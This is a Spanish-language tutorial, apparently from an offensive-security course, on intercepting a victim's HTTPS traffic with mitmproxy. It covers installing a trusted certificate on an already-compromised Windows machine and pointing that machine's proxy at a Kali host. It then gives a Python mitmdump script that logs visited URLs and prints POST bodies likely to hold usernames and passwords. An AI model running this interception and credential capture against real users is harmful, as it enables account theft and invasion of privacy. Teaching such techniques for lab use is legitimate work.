
----
- TAG: #Desarrollando #Creación #Sniffer #Tráfico #HTTPS #Mitmdump
----
En esta clase, vamos a sumergirnos en el mundo del espionaje de tráfico HTTPS creando un rastreador de consultas HTTPS (HTTPS Sniffer) con **mitmdump**. **Mitmdump** es una herramienta potente que actúa como un proxy, permitiéndonos interceptar, modificar y analizar el tráfico entre un cliente y un servidor, tanto para HTTP como para HTTPS.

El desafío con el tráfico HTTPS, que está cifrado para proteger la privacidad y seguridad de los datos, es que no se puede leer directamente. Aquí es donde entra en juego la instalación de un certificado en la máquina víctima. Al hacer esto, engañamos al dispositivo para que confíe en nuestro proxy, lo que nos permite descifrar y acceder al contenido del tráfico HTTPS.

Para esta clase, partimos de la base de que ya hemos vulnerado la máquina objetivo. Configuraremos mitmdump para que actúe como un proxy en nuestro equipo, redireccionando así el tráfico de la máquina víctima a través de nuestro sistema. Esto nos da un punto de observación privilegiado para examinar las comunicaciones seguras, una técnica de gran valor en el ámbito ofensivo de la ciberseguridad. Te guiaremos paso a paso en la configuración y el uso de esta herramienta, proporcionándote una habilidad clave para analizar y explotar las comunicaciones seguras en redes.

---
### Explicación General

En esta práctica, estamos simulando un ataque **MITM (Man-in-the-Middle)** empleando un **proxy**, lo que nos permitirá interceptar, visualizar y manipular el tráfico HTTPS que circula entre la víctima y el servidor web.

Usaremos la herramienta **mitmproxy** para realizar esta tarea, que nos ayudará a descifrar el tráfico HTTPS. Para que funcione, debemos instalar un certificado en la máquina víctima, lo que permitirá al proxy interceptar y desencriptar el tráfico.

### Instalación de mitmproxy

1. **Descargar mitmproxy** desde su página oficial:
   - Puedes dirigirte al repositorio en GitHub: [mitmproxy GitHub](https://github.com/mitmproxy/mitmproxy) 
   - O descargar los binarios directamente desde: [mitmproxy.org](https://mitmproxy.org/).

2. **Crear un directorio para mitmproxy**:
   ```bash
   mkdir mitmproxy
   mv /home/kali/Downloads/mitmproxy-10.4.2-linux-x86_64.tar.gz .
   ```

3. **Descomprimir el archivo** y eliminar el archivo `.tar.gz`:
   ```bash
   tar -xf mitmproxy-10.4.2-linux-x86_64.tar.gz
   rm mitmproxy-10.4.2-linux-x86_64.tar.gz
   ```

### Configuración en la Máquina Víctima

En la máquina Windows (víctima), configuraremos el navegador para que utilice nuestro proxy. Para hacerlo, sigue estos pasos:

1. **Instalar el certificado de mitmproxy**:
   - Ingresa a la URL `https://mitm.it` desde la máquina víctima. Esta página te permitirá descargar el certificado necesario para interceptar el tráfico HTTPS.
   - Elige la opción de descarga para Windows y sigue el proceso de instalación (clic en "Siguiente" hasta finalizar).
   
   Si ves el mensaje "if you can see this, traffic is not passing through mitmproxy", significa que el tráfico aún no pasa por el proxy. Esto es porque primero debemos configurar el proxy en la máquina víctima.

2. **Configurar el Proxy**:
   - En la configuración del proxy de la máquina víctima, deberás agregar la dirección IP de tu máquina Kali (atacante) y el puerto 8081, que será el puerto donde estará escuchando mitmproxy.

   En Windows, ve a:
   - **Configuración > Red e Internet > Proxy > Configuración manual del proxy** y agrega la IP de Kali y el puerto 8081.

### Ejecución de mitmproxy

Desde Kali Linux, ejecuta el siguiente comando para iniciar el servidor de mitmproxy:

```bash
./mitmweb
```

Esto levantará un servidor web en `http://127.0.0.1:8081/`, que actuará como intermediario en la comunicación entre la máquina víctima y el servidor al que quiera acceder.

Al navegar por cualquier página, mitmproxy comenzará a interceptar todo el tráfico. Si abres una página HTTPS, verás advertencias sobre seguridad en la máquina víctima, pero al instalar el certificado, estas advertencias desaparecerán.

---

### Interceptando HTTPS con un Script en Python

A continuación, vamos a crear un script en Python para interceptar tráfico HTTPS y filtrar posibles credenciales. Utilizaremos **mitmdump**, que es otra herramienta de mitmproxy que nos permite ejecutar scripts personalizados y procesar el tráfico.

#### Script `https_sniffer.py`

Este script imprimirá las URLs visitadas por la víctima y filtrará posibles credenciales enviadas en las solicitudes HTTP POST:

```python
#!/usr/bin/python3

from mitmproxy import http
from urllib.parse import urlparse

def request(packet):
    # Extraemos la URL completa desde el paquete interceptado
    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme  # Protocolo (http o https)
    domain = parsed_url.netloc  # Dominio
    path = parsed_url.path      # Ruta

    # Imprimimos la URL que está visitando la víctima
    print(f"[+] URL visitada por la víctima: {scheme}://{domain}{path}")

    # Filtramos posibles credenciales en la carga del paquete
    keywords = ["user", "pass", "username", "password"]
    if packet.request.method == "POST":
        data = packet.request.get_text()  # Extraemos el cuerpo del POST
        for keyword in keywords:
            if keyword in data:
                print(f"[+] Posibles credenciales encontradas: {data}")
                break
```

#### Ejecución del Script

Para que el script funcione con mitmdump, usa el siguiente comando:

```bash
mitmproxy/mitmdump -s https_sniffer.py --quiet
```

Este comando ejecutará mitmdump y vinculará el script `https_sniffer.py` para que procese todas las solicitudes interceptadas.

---

### Decodificación de Contraseñas

Si capturamos credenciales encriptadas en Base64, podemos decodificarlas con el siguiente comando en consola:

```bash
echo -n "dGVzMTIz" | base64 -d; echo
```

Este comando decodificará la cadena Base64, revelando las credenciales originales.

---

### Uso de mitmdump

La herramienta **mitmdump** permite adjuntar scripts personalizados y ofrece muchas opciones útiles para manipular y analizar tráfico. Si deseas ver todas las opciones disponibles, puedes ejecutar:

```bash
./mitmdump --help
```

---

### Resumen

1. **Configura mitmproxy** en la máquina Kali Linux y la máquina Windows (víctima) con el proxy y el certificado.
2. **Intercepta el tráfico** usando mitmdump y scripts en Python para analizar las solicitudes HTTP/HTTPS.
3. **Extrae credenciales** o cualquier otro dato sensible que pase por la red, ya que toda la comunicación estará siendo interceptada por tu proxy.
4. **Filtra y decodifica** la información capturada para obtener contraseñas y datos relevantes.

Este tipo de ataque **MITM** es bastante efectivo en entornos donde se puede comprometer el dispositivo víctima. ¡Recuerda que esto debe ser usado únicamente en entornos controlados o con fines educativos!